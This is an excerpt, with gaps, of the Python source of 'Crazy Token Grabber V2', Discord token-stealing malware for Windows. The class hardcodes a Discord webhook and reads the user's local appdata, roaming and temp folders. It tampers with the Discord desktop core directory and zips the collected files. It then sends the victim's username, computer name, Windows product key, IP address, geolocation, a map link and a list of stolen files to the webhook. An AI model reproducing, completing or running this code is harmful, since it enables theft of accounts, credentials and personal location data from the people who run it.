...
class Crazy_Token_Grabber_V2:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/986695292898385951/PNKD68dDX_hTLcAAFDuXiPwCGLZQ7SY-jmw0ZraSmKCUH-5npvRVxySLPA_GndZShqAE"
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Crazy_Token_Grabber_V2"
                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    ...
                    if not x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Made by Rdimo | https://github.com/Rdimo/Crazy-Token-Grabber-V2\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nMade by Rdimo | https://github.com/Rdimo/Crazy-Token-Grabber-V2")
                    else:
                        try:
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        pass
                    try:
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Crazy"))
    ...
    def SendInfo(self):
        ...
        try:
            ...
            pass
        _zipfile = os.path.join(self.appdata, f'Crazy.V2-[{os.getlogin()}].zip')
        ...
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/950302420725026877/955909068768309288/e4bde6906f4b50cb23754cfdc348f61e.png",
            "embeds": [
                {
                    "author": {
                        "name": "Crazy Token Grabber.V2",
                        
                        "icon_url": "https://cdn.discordapp.com/attachments/950302420725026877/955909068768309288/e4bde6906f4b50cb23754cfdc348f61e.png"
                    },
                    "description": f'**{os.getlogin()}** Just ran Crazy Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/950302420725026877/955909068768309288/e4bde6906f4b50cb23754cfdc348f61e.png"
                    },       
                }
            ]
        }
...
if __name__ == "__main__":
    if os.name == "nt": Crazy_Token_Grabber_V2()